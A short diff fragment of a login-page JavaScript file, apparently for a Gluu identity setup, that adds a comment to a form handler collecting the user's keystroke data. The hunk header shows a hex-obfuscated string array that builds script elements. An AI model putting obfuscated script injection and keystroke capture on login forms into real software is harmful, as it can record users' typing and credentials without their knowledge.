@@ -7,7 +7,7 @@ var _0xaa7f=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6
 
 // Handle the login form submit
 lform.onsubmit = function() {
-    k_data = getKeystrokesData()
+    k_data = getKeystrokesData() // User's keystrokes data
     // ... Add codes to send POST request to Gluu endpoint if neccessary
 };
 
